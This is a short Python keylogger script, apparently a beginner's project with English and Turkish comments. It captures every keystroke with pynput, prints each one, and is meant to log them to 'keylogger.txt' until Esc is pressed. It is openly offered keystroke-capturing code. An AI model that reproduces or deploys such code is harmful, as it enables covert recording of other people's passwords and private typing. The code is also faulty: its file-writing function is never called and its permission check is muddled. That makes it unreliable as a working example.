
import os
from pynput.keyboard import Key, Listener

count = 0
keys = []


def press_key(key):
    global keys, count
    keys.append(key)  # add to keys array which pressing key from keyboard
    count += 1
    print(" pressed {0} from keyboard".format(str(key)))


# Clerify the file path
file_path = os.path.abspath("keylogger.txt")

# If you dont have permission to write to file take the permission.
if not os.access(os.path.dirname(file_path), os.W_OK):
    try:
        os.makedirs(os.path.dirname(file_path))
    except PermissionError:
        print("Dosya oluşturma için izin yok.")
        exit()

# Dosyayı oluşturun
try:
    open(file_path, 'a').close()
except IOError:
    print("Dosya oluşturulamadı.")
    exit()

# Create write to file process


def write_file(keys):
    with open(file_path, "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write("\n")
            elif k.find("Key") == -1:
                file.write(k)

# Determine the when program is finished


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=press_key, on_release=on_release) as listener:
    listener.join()
